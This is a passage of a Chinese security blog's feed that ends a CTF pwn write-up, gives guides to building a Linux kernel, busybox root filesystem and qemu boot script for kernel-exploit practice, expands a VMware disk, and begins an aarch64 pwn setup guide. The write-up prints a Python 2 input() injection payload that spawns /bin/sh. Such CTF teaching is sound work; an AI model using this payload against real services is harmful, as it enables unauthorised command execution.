title="babyjsc"></a>babyjsc</h2><p>这道题纠结了好久，一直不会，比赛后找大佬问了才知道是python2的input()存在问题，可以直接逃逸。输入<code>__import__(&#39;os&#39;).system(&#39;/bin/sh&#39;)</code>即可getshell了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;PWN终于不是背锅了（流泪）。题目感觉有点ez，不过做出来的4道题PWN都是要概率的，这就很看脸了，全程脸黑的我每个脚本都打了二三十遍才拿到
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://nuoye-blog.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>kernel环境搭建</title>
    <link href="https://nuoye-blog.github.io/2020/08/21/dcb8d699/"/>
    <id>https://nuoye-blog.github.io/2020/08/21/dcb8d699/</id>
    <published>2020-08-21T04:00:00.000Z</published>
    <updated>2020-08-21T04:01:56.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以4.8.13版本为例，记录一下kernel的编译过程以及文件系统的搭建。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h2><p>GCC 7.4</p><p>Ubuntu 16.04</p><h2 id="内核编译"><a href="#内核编译" class="headerlink" title="内核编译"></a>内核编译</h2><h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.8.13.tar.xz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -xvf linux-4.8.13.tar.xz</span></span><br></pre></td></tr></table></figure><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> linux-4.8.13/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make menuconfig</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make -j4 <span class="comment">#四核编译，虽然还是要很久</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make all</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make modules</span></span><br></pre></td></tr></table></figure><p>编译完成后可以在当前目录下找到vmlinux文件（调试时使用），在arch/x86/boot目录下找到bzImage文件（启动kernel用的）。</p><h3 id="menuconfig配置"><a href="#menuconfig配置" class="headerlink" title="menuconfig配置"></a>menuconfig配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kernel heacking --&gt;</span><br><span class="line">Compile-time checks and compiler options --&gt;</span><br><span class="line">选中Compile the kernel with debug info、Reduce debugging information、Debug Filesystem，其他全部取消。</span><br><span class="line">去除Collect scheduler debugging info、Collect scheduler statistics选项。</span><br><span class="line">Processor type and features --&gt;</span><br><span class="line">取消Linux guest support选项。</span><br></pre></td></tr></table></figure><p>PS:编译出来的vmlinux几百MB，大佬们说去掉符号表就行了，但感觉去掉符号表的话要vmlinux就没用了呀。。以后有思路了再研究下怎么缩减吧。</p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p>编译时发生下列错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kernel&#x2F;built-in.o: In function &#96;update_wall_time&#39;:</span><br><span class="line">&#x2F;home&#x2F;ubn&#x2F;linux&#x2F;linux-4.8.13&#x2F;kernel&#x2F;time&#x2F;timekeeping.c:2079: undefined reference to &#96;____ilog2_NaN&#39;</span><br><span class="line">Makefile:951: recipe for target &#39;vmlinux&#39; failed</span><br><span class="line">make: *** [vmlinux] Error 1</span><br></pre></td></tr></table></figure><p>保存下列代码到<code>patch.diff</code>，然后运行<code>patch -i patch.diff</code>, 提示输入操作文件时， 先后输入<code>include/linux/log2.h</code>，<code>tools/include/linux/log2.h</code>即可。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/include/linux/log2.h b/include/linux/log2.h</span><br><span class="line">index ef3d4f67118c..c373295f359f 100644</span><br><span class="line"><span class="comment">--- a/include/linux/log2.h</span></span><br><span class="line"><span class="comment">+++ b/include/linux/log2.h</span></span><br><span class="line"><span class="meta">@@ -16,12 +16,6 @@</span></span><br><span class="line"> #include &lt;linux/bitops.h&gt;</span><br><span class="line"> </span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * deal with unrepresentable constant logarithms</span></span><br><span class="line"><span class="deletion">- */</span></span><br><span class="line"><span class="deletion">-extern __attribute__((const, noreturn))</span></span><br><span class="line"><span class="deletion">-int ____ilog2_NaN(void);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-/*</span></span><br><span class="line">  * non-constant log of base 2 calculators</span><br><span class="line">  * - the arch may override these in asm/bitops.h if they can be implemented</span><br><span class="line">  *   more efficiently than using fls() and fls64()</span><br><span class="line">@@ -85,7 +79,7 @@ unsigned long __rounddown_pow_of_two(unsigned long n)</span><br><span class="line"> #define ilog2(n)\</span><br><span class="line"> (\</span><br><span class="line"> __builtin_constant_p(n) ? (\</span><br><span class="line"><span class="deletion">-(n) &lt; 1 ? ____ilog2_NaN() :\</span></span><br><span class="line"><span class="addition">+(n) &lt; 2 ? 0 :\</span></span><br><span class="line"> (n) &amp; (1ULL &lt;&lt; 63) ? 63 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt; 62) ? 62 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt; 61) ? 61 :\</span><br><span class="line">@@ -148,10 +142,7 @@ unsigned long __rounddown_pow_of_two(unsigned long n)</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt;  4) ?  4 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt;  3) ?  3 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt;  2) ?  2 :\</span><br><span class="line"><span class="deletion">-(n) &amp; (1ULL &lt;&lt;  1) ?  1 :\</span></span><br><span class="line"><span class="deletion">-(n) &amp; (1ULL &lt;&lt;  0) ?  0 :\</span></span><br><span class="line"><span class="deletion">-____ilog2_NaN()\</span></span><br><span class="line"><span class="deletion">-   ) :\</span></span><br><span class="line"><span class="addition">+1 ) :\</span></span><br><span class="line"> (sizeof(n) &lt;= 4) ?\</span><br><span class="line"> __ilog2_u32(n) :\</span><br><span class="line"> __ilog2_u64(n)\</span><br><span class="line">diff --git a/tools/include/linux/log2.h b/tools/include/linux/log2.h</span><br><span class="line">index 41446668ccce..d5677d39c1e4 100644</span><br><span class="line"><span class="comment">--- a/tools/include/linux/log2.h</span></span><br><span class="line"><span class="comment">+++ b/tools/include/linux/log2.h</span></span><br><span class="line"><span class="meta">@@ -13,12 +13,6 @@</span></span><br><span class="line"> #define _TOOLS_LINUX_LOG2_H</span><br><span class="line"> </span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * deal with unrepresentable constant logarithms</span></span><br><span class="line"><span class="deletion">- */</span></span><br><span class="line"><span class="deletion">-extern __attribute__((const, noreturn))</span></span><br><span class="line"><span class="deletion">-int ____ilog2_NaN(void);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-/*</span></span><br><span class="line">  * non-constant log of base 2 calculators</span><br><span class="line">  * - the arch may override these in asm/bitops.h if they can be implemented</span><br><span class="line">  *   more efficiently than using fls() and fls64()</span><br><span class="line">@@ -78,7 +72,7 @@ unsigned long __rounddown_pow_of_two(unsigned long n)</span><br><span class="line"> #define ilog2(n)\</span><br><span class="line"> (\</span><br><span class="line"> __builtin_constant_p(n) ? (\</span><br><span class="line"><span class="deletion">-(n) &lt; 1 ? ____ilog2_NaN() :\</span></span><br><span class="line"><span class="addition">+(n) &lt; 2 ? 0 :\</span></span><br><span class="line"> (n) &amp; (1ULL &lt;&lt; 63) ? 63 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt; 62) ? 62 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt; 61) ? 61 :\</span><br><span class="line">@@ -141,10 +135,7 @@ unsigned long __rounddown_pow_of_two(unsigned long n)</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt;  4) ?  4 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt;  3) ?  3 :\</span><br><span class="line"> (n) &amp; (1ULL &lt;&lt;  2) ?  2 :\</span><br><span class="line"><span class="deletion">-(n) &amp; (1ULL &lt;&lt;  1) ?  1 :\</span></span><br><span class="line"><span class="deletion">-(n) &amp; (1ULL &lt;&lt;  0) ?  0 :\</span></span><br><span class="line"><span class="deletion">-____ilog2_NaN()\</span></span><br><span class="line"><span class="deletion">-   ) :\</span></span><br><span class="line"><span class="addition">+1 ) :\</span></span><br><span class="line"> (sizeof(n) &lt;= 4) ?\</span><br><span class="line"> __ilog2_u32(n) :\</span><br><span class="line"> __ilog2_u64(n)\</span><br></pre></td></tr></table></figure><h2 id="文件系统构建"><a href="#文件系统构建" class="headerlink" title="文件系统构建"></a>文件系统构建</h2><h3 id="下载busybox及编译"><a href="#下载busybox及编译" class="headerlink" title="下载busybox及编译"></a>下载busybox及编译</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.31.0.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.19.4.tar.bz2</span><br><span class="line"><span class="built_in">cd</span> busybox-1.19.4</span><br><span class="line">make menuconfig  </span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>make install后在目录下就会发现__install文件夹，里面的东西就可以用来构建文件系统了。</p><h3 id="menuconfig配置-1"><a href="#menuconfig配置-1" class="headerlink" title="menuconfig配置"></a>menuconfig配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary 编译成静态文件</span><br><span class="line"></span><br><span class="line">关闭下面两个选项:</span><br><span class="line">Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统</span><br><span class="line">Networking Utilities -&gt; [] inetd (Internet超级服务器)</span><br></pre></td></tr></table></figure><h3 id="构建文件系统"><a href="#构建文件系统" class="headerlink" title="构建文件系统"></a>构建文件系统</h3><p>这里需要先创建一些文件夹：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir proc sys dev etc</span><br></pre></td></tr></table></figure><p>下面添加一些东西，以便更好的使用：</p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>busybox里面默认是root用户，并且用户配置等东西不齐全，这里直接上<a href="http://pwn.eonew.cn/challenge.php" target="_blank" rel="noopener">星盟平台</a>扒下kernel的环境。</p><p>下载kernel pwn1，解压出来后，将其中的<code>etc/</code>目录复制过来，这样就有了用户pwn，并且也修复了用户文件，进而可以切换用户等操作了。</p><h3 id="修复dpkg"><a href="#修复dpkg" class="headerlink" title="修复dpkg"></a>修复dpkg</h3><p>dpkg是用来安装deb文件的（linux下一些软件都是提供deb包，可以在各大源网站下载到）。为了方便安装复现用的环境，需要先将dpkg修复</p><p>在目录下执行以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir var\lib\dpkg\info</span><br><span class="line">$ touch var\lib\dpkg\status</span><br></pre></td></tr></table></figure><p>这样就可以用<code>dpkg -i [packagename]</code>来安装一些依赖环境了。</p><h3 id="初始化文件init"><a href="#初始化文件init" class="headerlink" title="初始化文件init"></a>初始化文件init</h3><p>init文件是开机后自动运行的脚本，在其中可以执行一些命令，如挂载模块等，它具有root权限，并且需要通过该文件来执行/bin/sh，这样才能进入到命令行中。</p><p>这里给个基本的内容，具体的可以根据需要添加：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>直接保存到文件系统根目录的init中即可。</p><p>最后用命令<code>find . | cpio -o --format=newc &gt; ../rootfs.img</code>运行完毕后就可以得到我们的文件系统<code>rootfs.img</code>了。</p><h2 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h2><p>紧接着就是用qemu启动我们的kernel了，但是每次都要打一长串才能启动很不方便，所以一般都是将命令保存在shell文件中执行的。类似于下面的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 256M \</span><br><span class="line">-cpu kvm64 \</span><br><span class="line">-kernel .&#x2F;bzImage \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-nographic \</span><br><span class="line">-s \</span><br><span class="line">-smp 4,cores&#x3D;2,threads&#x3D;2 \</span><br><span class="line">-append &quot;console&#x3D;ttyS0 quiet nokaslr&quot;</span><br></pre></td></tr></table></figure><p>这里<code>qemu-system-x86_64</code>代表是x86的64位架构</p><p><code>-m 256M</code>表示分配256M物理内存给该kernel运行</p><p><code>-cpu kvm64</code>表示采用kvm64的cpu，同时如果要添加保护可以在这里加，如添加smep：<code>-cpu kvm64,smep</code>、</p><p><code>-kernel ./bzImage</code>用于使用的内核。</p><p><code>-initrd rootfs.img</code>用于指定选用的文件系统。</p><p><code>-nographic</code>表示不使用图形化界面，只使用串口。</p><p><code>-s</code>表示开启远程gdb调试，端口号为1234.</p><p><code>-smp 4,cores=2,threads=2</code>表示cpu为双核双线程。</p><p><code>-append &quot;console=ttyS0 quiet nokaslr&quot;</code>这里代表内核启动参数，不是很明白，不过nokaslr代表不开启内核地址随机化，如果要开启缓存kaslr即可。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/5763" target="_blank" rel="noopener">Linux kernel Exploit 内核漏洞学习(0)-环境安装 - 先知社区</a>  </p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2ODM4NzUyNQ==&mid=2247483853&idx=1&sn=1ceddc977a2aa4896da5569119a0f73b&chksm=eaf11467dd869d71cead6490138b4dcc4974c96dca57aa037dc1926feb70fb885e8159202047&scene=158#rd" target="_blank" rel="noopener">linux内核漏洞利用初探（1）：环境配置</a> </p><p><a href="https://blog.csdn.net/linyt/article/details/42504975" target="_blank" rel="noopener">从零使用qemu模拟器搭建arm运行环境_海枫的专栏-CSDN博客_如何模拟运行arm镜像文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以4.8.13版本为例，记录一下kernel的编译过程以及文件系统的搭建。&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; cl
      
    
    </summary>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/categories/linux/"/>
    
    
      <category term="qemu" scheme="https://nuoye-blog.github.io/tags/qemu/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="kernel" scheme="https://nuoye-blog.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>扩展ubuntu16磁盘空间</title>
    <link href="https://nuoye-blog.github.io/2020/08/19/e1fb1422/"/>
    <id>https://nuoye-blog.github.io/2020/08/19/e1fb1422/</id>
    <published>2020-08-19T06:00:00.000Z</published>
    <updated>2020-08-19T05:54:49.626Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>VMware中的ubuntu16感觉用太多了存了很多软件，然后还要编译内核等需要的空间比较大，所以研究了下怎么扩展磁盘。</p><h2 id="VMware中扩展磁盘"><a href="#VMware中扩展磁盘" class="headerlink" title="VMware中扩展磁盘"></a>VMware中扩展磁盘</h2><p>点击磁盘，扩展：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819124037.png" alt="image-20200819124028405"></p><p>修改为想要扩展的大小：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819124045.png" alt="image-20200819124044960"></p><p>然后确定即可。</p><h2 id="Linux中添加该磁盘空间"><a href="#Linux中添加该磁盘空间" class="headerlink" title="Linux中添加该磁盘空间"></a>Linux中添加该磁盘空间</h2><p>在vmware中添加后还不算完成，需要在linux中将磁盘空间分配上去才行。</p><p>下载软件gparted并运行（需要root权限）:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gparted</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo gparted</span></span><br></pre></td></tr></table></figure><p>界面如下：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819134941.png" alt="image-20200819133847264"></p><p>因为这时候原有的空间和新添加的空间中间被分割了，所以需要先去掉swap等分区。</p><p>可以看到钥匙标志，表示该分区被锁定。选中linux-swap，右键选择Swapoff即可去除锁定:</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819135046.png" alt="image-20200819134048074"></p><p>接着依次delete掉linux-swap和extended分区：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819135059.png" alt="image-20200819134149805"></p><p>可以看到在连在一起了，再右键点击ext4，选择Resize/Move，将空间分配进去：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819135106.png" alt="image-20200819134244736"></p><p>然后右键点击unallocated，将剩下的空间分配如下：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819135115.png" alt="image-20200819134407160"></p><p>然后选中extended下的unallocated，右键new，分配swap分区：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819135123.png" alt="image-20200819134638760"></p><p>接着点击<img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20200819135132.png" alt="image-20200819134725568">，然后再右击linux-swap，选择swapon，即可完成分配。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;VMware中的ubuntu16感觉用太多了存了很多软件，然后还要编译内核等需要的空间比较大，所以研究了下怎么扩展磁盘。&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/categories/linux/"/>
    
    
      <category term="vmware" scheme="https://nuoye-blog.github.io/tags/vmware/"/>
    
      <category term="ubuntu" scheme="https://nuoye-blog.github.io/tags/ubuntu/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>arm_pwn环境搭建及初探</title>
    <link href="https://nuoye-blog.github.io/2020/07/24/22a5ca48/"/>
    <id>https://nuoye-blog.github.io/2020/07/24/22a5ca48/</id>
    <published>2020-07-24T07:00:00.000Z</published>
    <updated>2020-07-24T07:28:40.377Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://mp.weixin.qq.com/s/AwNPbG9kT3Wb-FcjbQJq4w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AwNPbG9kT3Wb-FcjbQJq4w</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如今越来越多的pwn运行在其他的CPU架构下，本章主要以aarch64为例，讲解下环境的搭建以及arm64架构。环境搭建过程可扩展到其他cpu架构体系。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装qemu及相应的libc环境"><a href="#安装qemu及相应的libc环境" class="headerlink" title="安装qemu及相应的libc环境"></a>安装qemu及相应的libc环境</h3><p>qemu的安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu-user</span><br><span class="line">$ sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386</span><br></pre></td></tr></table></figure><p>libc环境安装（安装后libc环境存放在/usr/aarch64-linux-gnu目录下）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install libc6-arm64-cross</span><br></pre></td></tr></table></figure><h5 id="正常启动："><a href="#正常启动：" class="headerlink" title="正常启动："></a>正常启动：</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-aarch64 -L /usr/aarch64-linux-gnu ./baby_arm</span><br></pre></td></tr></table></figure><h5 id="调试模式："><a href="#调试模式：" class="headerlink" title="调试模式："></a>调试模式：</h5><p>首先安装gdb-multiarch：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure><p>qemu调试模式启动(调试端口为1235)：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-aarch64 -g 1235 -L /usr/aarch64-linux-gnu ./baby_arm</span><br></pre></td></tr></table></figure><p>gdb-multiarch调试：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch ./baby_arm</span><br><span class="line">pwndbg&gt;target remote localhost:1235</span><br></pre></td></tr></table></figure><p>或者（可用show architecture查看当前CPU架构）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture aarch64</span><br><span class="line">pwndbg&gt; target remote localhost:1235</span><br></pre></td></tr></table></figure><h3 id="pwntools相关"><a href="#pwntools相关" class="headerlink" title="pwntools相关"></a>pwntools相关</h3><p>一般来说还是比较习惯用pwntools来写题目，所以就研究了下相关的使用方法。</p><p>首先是环境搭建：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkdir /etc/qemu-binfmt</span><br><span class="line">$ sudo ln -s /usr/aarch64-linux-gnu /etc/qemu-binfmt/aarch64</span><br><span class="line">$ sudo apt-get install binutils-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><p>将相应的libc环境链接到/etc/qemu-binfmt目录下，这样pwntools运行的时候就会用qemu启动，并在相应目录下查找对应架构的环境，从而运行程序。binutils-aarch64-linux-gnu这一程序则是用与asm模块使用的，主要是shellcode之类的需要用到。环境配置好后然后直接按照x86架构的方式运行即可。</p><p>如果需要用gdb调试的话，则需要用gdb.debug()来启动程序才能进行调试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line">p = gdb.debug(<span class="string">"./baby_arm"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="arm相关基础（以64位为准）"><a href="#arm相关基础（以64位为准）" class="headerlink" title="arm相关基础（以64位为准）"></a>arm相关基础（以64位为准）</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>含有31个64位通用寄存器（包括x0~x28，fp/x29、lr/x30）、栈指针寄存器（sp）以及程序计数器（pc）以及一次程序状态寄存器（cpsr），在gdb中可用<code>info r</code>查看。</p><p>其中x0~x7一般是函数的参数，x0一般表示返回值。lr/x30寄存器存放着函数的返回地址。</p><h3 id="arm64调用约定"><a href="#arm64调用约定" class="headerlink" title="arm64调用约定"></a>arm64调用约定</h3><p>arm64位调用约定采用AAPCS64。参数1<del>参数8 分别保存到 X0</del>X7 寄存器中 ，剩下的参数从右往左一次入栈，被调用者实现栈平衡，返回值存放在 X0 中。</p><p>返回时，通过LDP  x29, x30, [sp, #0x10];指令将调用前的的栈指针以及返回地址弹出到fp和lr寄存器。接着使用RET指令，令SP=FP，PC=LR，从而完成函数调用的返回。</p><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 